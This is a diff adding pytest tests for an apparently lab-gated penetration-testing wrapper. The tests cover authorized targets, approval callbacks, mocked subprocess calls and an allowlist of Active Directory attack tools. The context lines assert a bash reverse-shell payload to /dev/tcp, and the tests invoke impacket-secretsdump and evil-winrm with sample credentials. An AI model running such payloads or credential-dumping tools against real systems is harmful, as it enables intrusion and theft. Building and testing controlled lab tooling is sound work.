@@ -116,3 +116,38 @@ def test_payload_generation_is_lab_gated(tmp_path):
     p = labtools.make_payload(cfg, db, "10.8.1.2", 4444, "bash")
     assert p == "bash -i >& /dev/tcp/10.8.1.2/4444 0>&1"
     assert any(e["action"] == "offense" for e in db.safety_events(5))
+
+
+def _fake_flex(monkeypatch, output="ok"):
+    monkeypatch.setattr(labtools, "tool_available", lambda t: True)
+    calls = {}
+    def fake(cmd, *a, **k):
+        calls["cmd"] = cmd
+        calls["captured"] = k.get("capture_output", False)
+        return types.SimpleNamespace(stdout=output, stderr="", returncode=0)
+    monkeypatch.setattr(labtools.subprocess, "run", fake)
+    return calls
+
+
+def test_connection_string_target_not_reappended(tmp_path, monkeypatch):
+    calls = _fake_flex(monkeypatch)
+    cfg, db = _setup(tmp_path, authorize="10.10.1.1")
+    # impacket uses 'domain/user:pass@target' — target already present, so it must NOT be appended again
+    r = labtools.run_tool(cfg, db, "impacket-secretsdump", "10.10.1.1",
+                          args=["corp/bob:pass@10.10.1.1"], approve=lambda *a: True)
+    assert r["cmd"] == ["impacket-secretsdump", "corp/bob:pass@10.10.1.1"]
+
+
+def test_interactive_tool_runs_attached_not_captured(tmp_path, monkeypatch):
+    calls = _fake_flex(monkeypatch)
+    cfg, db = _setup(tmp_path, authorize="10.10.1.1")
+    r = labtools.run_tool(cfg, db, "evil-winrm", "10.10.1.1", args=["-u", "admin", "-p", "pw", "-i"],
+                          approve=lambda *a: True)
+    assert r["output"] == "(interactive session ended)"
+    assert calls["captured"] is False               # attached to the terminal, not captured
+
+
+def test_new_windows_ad_tools_are_allowlisted():
+    for t in ("evil-winrm", "netexec", "impacket-GetNPUsers", "impacket-psexec", "bloodhound-python",
+              "ldapsearch", "kerbrute", "nuclei", "ssh"):
+        assert t in labtools.TOOLS, t
